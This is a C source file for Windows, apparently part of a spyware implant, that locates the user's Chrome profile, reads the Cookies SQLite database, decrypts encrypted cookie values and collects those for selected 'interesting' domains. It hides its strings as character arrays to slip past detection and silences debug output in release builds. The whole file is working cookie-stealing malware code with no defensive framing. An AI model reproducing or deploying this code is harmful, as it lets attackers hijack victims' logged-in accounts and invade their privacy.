#include <Windows.h>
#include <Shlobj.h>
#include <stdio.h>

#include "globals.h"
#include "zmem.h"
#include "utils.h"
#include "social.h"
#include "cookies.h"
#include "chrome_cookies.h"
#include "chrome_password.h"
#include "sqlite.h"
#include "debug.h"

/*
LPSTR GetChromeProfilePath()
{
	LPSTR strProfilePath = (LPSTR) zalloc(MAX_FILE_PATH+1);
	SHGetSpecialFolderPathA(NULL, strProfilePath, CSIDL_LOCAL_APPDATA, TRUE);

	_snprintf_s(strProfilePath, MAX_FILE_PATH, _TRUNCATE, "%s\\Google\\Chrome\\User Data\\Default", strProfilePath); // FIXME: array

	LPSTR strShortPath = (LPSTR) zalloc(MAX_FILE_PATH+1);
	GetShortPathNameA(strProfilePath, strShortPath, MAX_FILE_PATH);
	zfree(strProfilePath);

	if (!PathFileExistsA(strShortPath))
	{
		zfree(strShortPath);
		return NULL;
	}

	return strShortPath;
}
*/

int ParseChromeCookies(LPVOID lpReserved, int dwColumns, LPSTR *strValues, LPSTR *strNames)
{
	LPSTR strHost, strName, strValue, strEncPass;
	strHost = strName = strValue = strEncPass = NULL;

	CHAR strFName[] = { 'n', 'a', 'm', 'e', 0x0 };
	CHAR strFValue[] = { 'v', 'a', 'l', 'u', 'e', 0x0 };
	CHAR strFHost[] = { 'h', 'o', 's', 't', '_', 'k', 'e', 'y', 0x0 };
	CHAR strEncVal[] = { 'e', 'n', 'c', 'r', 'y', 'p', 't', 'e', 'd', '_', 'v', 'a', 'l', 'u', 'e', 0x0 };
	for (int i=0; i<dwColumns; i++)
	{
		if (!strHost && !_stricmp(strNames[i], strFHost)) 
		{
			strHost = _strdup(strValues[i]);
			NormalizeDomainA(strHost);
			if (!IsInterestingDomainA(strHost))
				break;
		}
		if (!strName && !_stricmp(strNames[i], strFName))  
			strName = _strdup(strValues[i]);
		if (!strValue && !_stricmp(strNames[i], strFValue))
			strValue = _strdup(strValues[i]);
		if (!_stricmp(strNames[i], strEncVal))
		{
			LPWSTR strTmp = DecryptChromePass((LPBYTE)strValues[i]);
			if (strTmp && wcslen(strTmp))
			{
				strEncPass = (LPSTR) zalloc((wcslen(strTmp)+1)*sizeof(WCHAR));
				_snprintf_s(strEncPass, (wcslen(strTmp)+1)*sizeof(WCHAR), _TRUNCATE, "%S", strTmp);
			}
			free(strTmp);
		}
	}

	if (strHost)
	{
		if (strName && IsInterestingDomainA(strHost))
		{
			if (strValue && strValue[0] == 0x0 && strEncPass != NULL)
			{
#ifdef _DEBUG
	OutputDebug(L"[*] Adding encr cookie from Chrome for host:%S  %S=%S\n", strHost, strName, strEncPass);
#endif
				AddCookieA(strHost, strName, strEncPass);
			}
			else
			{
#ifdef _DEBUG
	OutputDebug(L"[*] Adding clear cookie from Chrome for host:%S  %S=%S\n", strHost, strName, strValue);
#endif
				AddCookieA(strHost, strName, strValue);
			}
		}
	}

	zfree(strHost);
	zfree(strName);
	zfree(strValue);
	zfree(strEncPass);

	return 0;
}


BOOL DumpSqliteChrome(LPSTR strProfilePath, LPSTR strSignonFile)
{
	LPSTR strPath = (LPSTR) zalloc(MAX_FILE_PATH+1);
	sprintf_s(strPath, MAX_PATH, "%s\\%s", strProfilePath, strSignonFile);

	sqlite3 *lpDb = NULL;
	if (sqlite3_open((const char *)strPath, &lpDb) == SQLITE_OK)
	{
#ifdef _DEBUG
		LPSTR strErr;
		if (sqlite3_exec(lpDb, "SELECT * FROM cookies;", ParseChromeCookies, NULL, &strErr) != SQLITE_OK)  //FIXME: array
		{
			OutputDebug(L"[!!] Querying sqlite3 for chrome cookies: %S\n", strErr);
			zfree(strErr);
		}
#else
		CHAR strQuery[] = { 'S', 'E', 'L', 'E', 'C', 'T', ' ', '*', ' ', 'F', 'R', 'O', 'M', ' ', 'c', 'o', 'o', 'k', 'i', 'e', 's', ';', 0x0 };
		sqlite3_exec(lpDb, strQuery, ParseChromeCookies, NULL, NULL);
#endif
		sqlite3_close(lpDb);
	}
	

	zfree(strPath);
	return TRUE;
}

VOID DumpChromeCookies()
{
	LPSTR strProfilePath = GetChromeProfilePathA();
	if (!strProfilePath)
		return;

	CHAR strCookies[] = { 'C', 'o', 'o', 'k', 'i', 'e', 's', 0x0 };
	DumpSqliteChrome(strProfilePath, strCookies);
	 
	zfree(strProfilePath);
}